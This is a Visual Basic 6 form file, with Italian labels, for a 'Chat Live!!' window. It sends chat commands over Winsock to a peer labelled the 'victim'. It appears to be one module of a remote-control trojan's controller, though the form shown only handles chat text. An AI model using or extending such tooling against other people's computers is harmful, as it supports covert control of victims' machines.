VERSION 5.00
Begin VB.Form Form14 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Chat Live!!"
   ClientHeight    =   5325
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   4530
   LinkTopic       =   "Form14"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5325
   ScaleWidth      =   4530
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   360
      TabIndex        =   6
      Text            =   "Hacker"
      Top             =   4320
      Width           =   1575
   End
   Begin VB.TextBox Text3 
      BackColor       =   &H00000000&
      ForeColor       =   &H000000FF&
      Height          =   285
      Left            =   2640
      TabIndex        =   5
      Text            =   "Lamer"
      Top             =   4320
      Width           =   1575
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Inzia Chat"
      Height          =   255
      Left            =   1560
      TabIndex        =   4
      Top             =   4800
      Width           =   1455
   End
   Begin VB.ListBox List1 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   2625
      Left            =   120
      TabIndex        =   3
      Top             =   120
      Width           =   4335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Termina Chat"
      Height          =   255
      Left            =   1560
      TabIndex        =   2
      Top             =   3600
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Invia"
      Height          =   255
      Left            =   3360
      TabIndex        =   1
      Top             =   3120
      Width           =   1095
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   3120
      Width           =   3135
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Tuo NickName"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   360
      TabIndex        =   8
      Top             =   3960
      Width           =   1080
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "NickName Vittima"
      ForeColor       =   &H000000FF&
      Height          =   195
      Left            =   2760
      TabIndex        =   7
      Top             =   3960
      Width           =   1260
   End
End
Attribute VB_Name = "Form14"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


Private Sub Command1_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "chat|" & Text1.Text & " ; " & Text2.Text
List1.AddItem Text1.Text & " ; " + Text2.Text
Text2.Text = ""

End Sub

Private Sub Command2_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "chatOFF"
End Sub

Private Sub Command3_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "ChatOn|" & Text3.Text


End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Form1.Winsock1(Form1.Label14.Caption).SendData "chatOFF"
End Sub

Private Sub Text2_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
Form1.Winsock1(Form1.Label14.Caption).SendData "chat|" & Text1.Text & " ; " & Text2.Text
List1.AddItem Text1.Text & " ; " + Text2.Text
Text2.Text = ""

End If
List1.ListIndex = List1.NewIndex
End Sub

